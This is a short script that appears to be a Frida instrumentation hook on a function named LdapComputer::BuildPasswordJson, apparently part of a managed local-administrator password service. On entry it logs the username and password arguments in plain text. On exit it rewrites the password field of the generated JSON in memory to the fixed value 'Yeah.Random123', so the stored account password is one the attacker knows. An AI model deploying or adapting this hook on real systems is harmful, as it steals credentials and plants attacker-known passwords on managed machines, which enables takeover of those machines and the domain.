defineHandler({
    onEnter(log, args, state) {
        log('[SET] LdapComputer::BuildPasswordJson');

        const username = args[1].readUtf16String();
        const password = args[2].readUtf16String();

        log(`--> Username (args[1]): ${username} / Password (args[2]): ${password}`);

        this.arg4 = args[4];
    },

    onLeave(log, retval, state) {
        log('Leaving LdapComputer::BuildPasswordJson - Changing password');

        if (retval == 0) {
            try {
                const ptr = this.arg4.readPointer();
                const s = ptr.readUtf16String();

                const key = '"p":"';
                const start = s.indexOf(key);
                if (start === -1) {
                    log(' --> Password key not found in JSON string.');
                    return;
                }

                const pwdStart = start + key.length;
                const pwdEnd = s.indexOf('"', pwdStart);
                if (pwdEnd === -1) {
                    log(' --> Closing quote for password not found.');
                    return;
                }

                const newPwd = 'Yeah.Random123';
                const updatedString = s.substring(0, pwdStart) + newPwd + s.substring(pwdEnd);

                log(`New password: ${newPwd}`);
                log(`Updated JSON: ${updatedString}`);

                ptr.writeUtf16String(updatedString);
            } catch (err) {
                log(` --> Error updating password: ${err.message}`);
            }
        }
    }
});
